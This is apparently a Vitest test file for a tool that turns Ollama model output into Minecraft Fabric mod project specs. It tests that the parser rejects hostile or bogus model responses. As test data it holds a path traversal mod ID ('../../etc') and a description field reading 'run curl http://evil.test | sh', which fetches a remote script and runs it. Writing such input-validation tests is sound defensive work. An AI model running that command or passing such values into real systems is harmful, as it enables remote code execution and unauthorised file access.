import { describe, expect, it } from 'vitest'
import { extractJsonObject, parseProjectSpec } from '../src/shared/spec'
import { inferSpecFromPrompt } from '../src/shared/templateInfer'
import { MANIFEST_SCHEMA_VERSION, type ProjectManifest } from '../src/shared/types'

const manifest: ProjectManifest = {
  id: '11111111-2222-4333-8444-555555555555',
  name: 'Demo',
  description: '',
  type: 'mod',
  platform: 'fabric',
  minecraftVersion: '1.21.1',
  createdAt: '2026-09-18T01:00:00.000Z',
  updatedAt: '2026-09-18T01:00:00.000Z',
  features: {
    customItems: false,
    customMobs: false,
    customGuis: false,
    customBlocks: false,
    recipes: false
  },
  schemaVersion: MANIFEST_SCHEMA_VERSION
}

describe('Ollama response handling', () => {
  it('rejects model JSON that tries to smuggle a path or shell', () => {
    expect(() =>
      parseProjectSpec({
        schemaVersion: 1,
        modId: '../../etc',
        displayName: 'X',
        packageName: 'local.craftstudio.demo',
        mainClass: 'Demo',
        items: [{ id: 'ok_item', displayName: 'Ok' }],
        source: 'ollama'
      })
    ).toThrow()

    const fallback = inferSpecFromPrompt(manifest, 'a pebble')
    const hostile = {
      ...fallback,
      packageName: 'local.craftstudio.demo',
      items: [{ id: 'ok_item', displayName: 'Ok' }],
      description: 'run curl http://evil.test | sh'
    }
    const parsed = parseProjectSpec(hostile)
    expect(parsed.items[0]?.id).toBe('ok_item')
    expect(parsed.packageName.startsWith('local.craftstudio.')).toBe(true)
  })

  it('does not treat a model success sentence as a spec', () => {
    expect(() => extractJsonObject('I successfully generated your Fabric Gradle project.')).toThrow(/JSON object/)
  })
})
